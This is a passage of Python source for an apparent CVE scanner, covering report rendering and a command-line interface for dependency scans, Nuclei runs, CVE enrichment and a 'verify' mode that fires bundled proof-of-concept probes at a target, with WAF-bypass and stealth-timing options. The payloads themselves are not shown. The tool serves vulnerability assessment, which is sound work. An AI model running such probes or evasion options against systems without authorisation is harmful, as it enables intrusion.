    rows = []
    for f in sorted(findings, key=lambda x: (order.get(x.get("priority"), 4),
                                              -(x.get("epss") or 0))):
        cve = f.get("cve_id") or f.get("id") or "UNKNOWN"
        cwe_list = f.get("cwe") or []
        cwe_name = cwe_friendly(cwe_list[0]) if cwe_list else "Unknown"
        prio = f.get("priority", "UNKNOWN")
        fp = f.get("false_positive_status", "UNKNOWN")
        reason = (f.get("false_positive_reason") or "")[:200]
        color = {"CRITICAL": "#b71c1c", "HIGH": "#d84315",
                 "MEDIUM": "#f57f17", "LOW": "#2e7d32"}.get(prio, "#555")
        fp_color = {"CONFIRMED": "#b71c1c", "LIKELY_REAL": "#d84315",
                    "NEEDS_REVIEW": "#f57f17", "LIKELY_FALSE_POSITIVE": "#2e7d32",
                    "UNVERIFIED": "#555"}.get(fp, "#555")
        rows.append(
            f"<tr><td style='color:{color};font-weight:bold'>{prio}</td>"
            f"<td>{cve}<br><small>{cwe_name} {', '.join(cwe_list)}</small></td>"
            f"<td>{f.get('package','?')} <small>{f.get('version','')}</small></td>"
            f"<td>{f.get('cvss') or '-'}</td>"
            f"<td>{(f.get('epss') or 0):.2%}</td>"
            f"<td>{'Yes' if f.get('in_kev') else 'No'}</td>"
            f"<td style='color:{fp_color};font-weight:bold'>{fp}</td>"
            f"<td><small>{reason}</small></td></tr>"
        )
    html = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>CVE Scan Report</title>
<style>
body{{font-family:system-ui,sans-serif;margin:20px;color:#222}}
h1{{border-bottom:2px solid #333;padding-bottom:8px}}
table{{border-collapse:collapse;width:100%;font-size:13px}}
th,td{{border:1px solid #ddd;padding:6px 8px;text-align:left;vertical-align:top}}
th{{background:#f4f4f4;position:sticky;top:0}}
tr:nth-child(even){{background:#fafafa}}
small{{color:#666}}.meta{{color:#666;margin-bottom:16px}}
</style></head><body>
<h1>CVE Scan Report</h1>
<div class="meta">Generated: {time.strftime("%Y-%m-%d %H:%M:%S")} ·
{len(findings)} finding(s) · cve_scanner v{__version__}</div>
<table><thead><tr>
<th>Priority</th><th>CVE / Type</th><th>Package</th><th>CVSS</th>
<th>EPSS</th><th>KEV</th><th>FP Status</th><th>Reason</th>
</tr></thead><tbody>{''.join(rows)}</tbody></table></body></html>"""
    path.write_text(html, encoding="utf-8")
    print(f"[+] HTML saved:  {path}")


def print_report(findings: List[dict]) -> None:
    if not findings:
        print("\n[+] No known vulnerabilities found.")
        return
    order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "UNKNOWN": 4}
    findings.sort(key=lambda f: (order.get(f.get("priority"), 4),
                                 -(f.get("epss") or 0)))
    print("\n" + "=" * 88)
    print(f"SCAN RESULTS: {len(findings)} finding(s)")
    print("=" * 88)
    for f in findings:
        cve = f.get("cve_id") or f.get("id") or "UNKNOWN"
        cwe_list = f.get("cwe") or []
        cwe_name = cwe_friendly(cwe_list[0]) if cwe_list else "Unknown"
        cwe_str = ", ".join(cwe_list) if cwe_list else "N/A"
        prio = f.get("priority", "UNKNOWN")
        fp = f.get("false_positive_status", "UNKNOWN")
        reason = f.get("false_positive_reason", "")
        flags = []
        if f.get("in_kev"): flags.append("KEV")
        if (f.get("epss") or 0) >= 0.1: flags.append(f"EPSS {f['epss']:.2%}")
        if f.get("cvss") is not None: flags.append(f"CVSS {f['cvss']}")
        print(f"\n[{prio}] {cve}  ({cwe_name})")
        print(f"  Package   : {f.get('package','?')} {f.get('version','')} "
              f"({f.get('ecosystem','')})")
        print(f"  CWE Type  : {cwe_str} — {cwe_name}")
        print(f"  FP Status : {fp}")
        if reason: print(f"  Reason    : {reason[:180]}")
        if flags:  print(f"  Signals   : {'  '.join(flags)}")
        if f.get("summary"):
            print(f"  Summary   : {f['summary'][:200]}")
        if f.get("matched_at"):
            print(f"  Matched   : {f['matched_at']}")
        attempts = f.get("verification_attempts")
        if attempts:
            print("  Attempts  :")
            for a in attempts:
                print(f"    - {a.get('method')}: {a.get('status')}")
    counts = Counter(f.get("false_positive_status") for f in findings)
    print("\n" + "-" * 88)
    for key in ("CONFIRMED", "LIKELY_REAL", "NEEDS_REVIEW",
                "LIKELY_FALSE_POSITIVE", "UNVERIFIED"):
        if counts.get(key):
            print(f"  {key:<22}: {counts[key]}")
    print(f"  {'TOTAL':<22}: {len(findings)}")
    print("-" * 88)


# ================================================================
# CLI
# ================================================================
def _setup_logging(verbose: int) -> None:
    level = logging.WARNING
    if verbose == 1: level = logging.INFO
    if verbose >= 2: level = logging.DEBUG
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    )


def _setup_sigint() -> None:
    def handler(sig, frame):
        if _SHUTDOWN.is_set():
            log.warning("Forcing exit.")
            sys.exit(130)
        log.warning("Interrupt received — finishing current request, "
                    "then saving partial results (Ctrl+C again to force).")
        _SHUTDOWN.set()
    signal.signal(signal.SIGINT, handler)


def _parse_header_arg(value: str) -> Tuple[str, str]:
    if ":" not in value:
        raise argparse.ArgumentTypeError(
            f"Header must be 'Name: value', got: {value}")
    k, v = value.split(":", 1)
    return k.strip(), v.strip()


def _validate_target(url: str) -> str:
    p = urlparse(url)
    if p.scheme not in ("http", "https"):
        raise argparse.ArgumentTypeError(
            f"Target must start with http:// or https://, got: {url}")
    return url


def _apply_profile(args) -> None:
    if args.profile == "stealth":
        if args.rate == 0.0: args.rate = 1.0
        if args.jitter == 0.0: args.jitter = 1.0
    elif args.profile == "aggressive":
        if args.rate == 0.0: args.rate = 0.0


def main() -> None:
    ap = argparse.ArgumentParser(
        description=f"Free CVE scanner with CVE + CWE PoC verification "
                    f"(v{__version__})")
    ap.add_argument("--version", action="version",
                    version=f"cve_scanner {__version__}")
    ap.add_argument("-v", "--verbose", action="count", default=0)
    ap.add_argument("--list-payloads", action="store_true",
                    help="Print all CWE probes and exit")
    ap.add_argument("--list-cves", action="store_true",
                    help="Print all CVE probes and exit")

    sub = ap.add_subparsers(dest="command")

    p_deps = sub.add_parser("deps", help="Scan dependencies via OSV")
    p_deps.add_argument("file", type=Path)
    p_deps.add_argument("-o", "--output", type=Path)
    p_deps.add_argument("--csv", type=Path)
    p_deps.add_argument("--sarif", type=Path)
    p_deps.add_argument("--html", type=Path)
    p_deps.add_argument("--workers", type=int, default=8)

    p_dast = sub.add_parser("dast", help="Run Nuclei against a URL")
    p_dast.add_argument("target", type=_validate_target)
    p_dast.add_argument("-o", "--output", type=Path)
    p_dast.add_argument("--csv", type=Path)
    p_dast.add_argument("--sarif", type=Path)
    p_dast.add_argument("--html", type=Path)
    p_dast.add_argument("--severity", default="critical,high,medium")
    p_dast.add_argument("--tags", default="cve,vkev,kev")
    p_dast.add_argument("--timeout", type=int, default=900)

    p_verify = sub.add_parser("verify",
                              help="Verify findings with CVE + CWE PoCs")
    p_verify.add_argument("report", type=Path)
    p_verify.add_argument("--target", required=True, type=_validate_target)
    p_verify.add_argument("-o", "--output", type=Path)
    p_verify.add_argument("--csv", type=Path)
    p_verify.add_argument("--sarif", type=Path)
    p_verify.add_argument("--html", type=Path)
    p_verify.add_argument("--skip-confirmed", action="store_true")
    p_verify.add_argument("--dry-run", action="store_true")
    p_verify.add_argument("--waf-bypass", action="store_true")
    p_verify.add_argument("--insecure", action="store_true")
    p_verify.add_argument("--header", action="append", type=_parse_header_arg,
                          default=[], help="HTTP header 'K: V' (repeatable)")
    p_verify.add_argument("--basic-auth", type=str, default=None,
                          help="user:pass")
    p_verify.add_argument("--cookie", type=str, default=None)
    p_verify.add_argument("--rate", type=float, default=0.0,
                          help="Requests per second (0 = unlimited)")
    p_verify.add_argument("--jitter", type=float, default=0.0,
                          help="Random delay jitter (seconds)")
    p_verify.add_argument("--profile",
                          choices=["stealth", "normal", "aggressive"],
                          default="normal")

    p_enrich = sub.add_parser("enrich", help="Enrich a single CVE")
    p_enrich.add_argument("cve_id")

    args = ap.parse_args()
    _setup_logging(args.verbose)
    _setup_sigint()

    if args.list_payloads:
        print(f"cve_scanner v{__version__} — CWE payload library\n")
        for cwe, probe in CWE_PROBES.items():
            print(f"{cwe}  {probe['label']}")
            for p in probe["payloads"]:
                print(f"    {p[:100]}")
            print()
        return

    if args.list_cves:
        print(f"cve_scanner v{__version__} — CVE-specific probes "
              f"({len(CVE_PROBES)} entries)\n")
        for cve, probe in CVE_PROBES.items():
            print(f"{cve}  {probe['label']}")
            for p in probe["probes"]:
                method = p.get("method", "GET")
                path = p.get("path", "/")
                print(f"    {method} {path}")
            print()
        return

    if not args.command:
        ap.print_help()
        return

    if args.command == "deps":
        findings = enrich_findings(scan_dependencies(args.file, args.workers),
                                   workers=args.workers)
        print_report(findings)
        if args.output: save_json(findings, args.output)
        if args.csv:    save_csv(findings, args.csv)
        if args.sarif:  save_sarif(findings, args.sarif)
        if args.html:   save_html(findings, args.html)

    elif args.command == "dast":
        findings = run_nuclei_dast(args.target, args.severity,
                                   args.tags, args.timeout)
        if findings:
            findings = enrich_findings(findings)
        print_report(findings)
        if args.output: save_json(findings, args.output)
        if args.csv:    save_csv(findings, args.csv)
        if args.sarif:  save_sarif(findings, args.sarif)
        if args.html:   save_html(findings, args.html)

    elif args.command == "verify":
        if not args.report.exists():
            log.error(f"Report not found: {args.report}")
            sys.exit(1)
        findings = json.loads(args.report.read_text())
        ensure_metadata(findings)
        _apply_profile(args)

        user_headers = {k: v for k, v in args.header}
        basic_auth = tuple(args.basic_auth.split(":", 1)) \
                     if args.basic_auth else None
        session = build_session(insecure=args.insecure,
                                user_headers=user_headers,
                                basic_auth=basic_auth,
                                cookie=args.cookie)
        limiter = RateLimiter(rate=args.rate, jitter=args.jitter)

        findings = verify_findings(
            findings, args.target,
            session=session, limiter=limiter,
            skip_confirmed=args.skip_confirmed,
            waf_bypass=args.waf_bypass,
            dry_run=args.dry_run,
        )
        print_report(findings)
        if args.output: save_json(findings, args.output)
        if args.csv:    save_csv(findings, args.csv)
        if args.sarif:  save_sarif(findings, args.sarif)
        if args.html:   save_html(findings, args.html)

    elif args.command == "enrich":
        cve = args.cve_id.upper()
        if not re.match(r"^CVE-\d{4}-\d{4,}$", cve):
            log.error(f"Invalid CVE ID: {cve} (expected CVE-YYYY-NNNN)")
            sys.exit(1)
        kev = fetch_kev()
        epss = fetch_epss_batch([cve])
        nvd = fetch_nvd_cve(cve)
        cwes = extract_cwe(nvd) if nvd else []
        cvss = extract_cvss(nvd) if nvd else None
        print(f"\nCVE      : {cve}")
        print(f"In KEV   : {'YES — actively exploited' if cve in kev else 'NO'}")
        print(f"EPSS     : {epss.get(cve, 0.0):.2%}")
        print(f"CVSS     : {cvss if cvss is not None else 'N/A'}")
        print(f"CWE Type : {cwe_list_friendly(cwes)}")
        has_probe = cve in CVE_PROBES
        print(f"CVE PoC  : {'available — ' + CVE_PROBES[cve]['label'] if has_probe else 'not bundled (use Nuclei)'}")
        if nvd:
            d = (nvd.get("descriptions") or [{}])[0].get("value", "")
            print(f"Summary  : {d[:500]}")


if __name__ == "__main__":
    main()
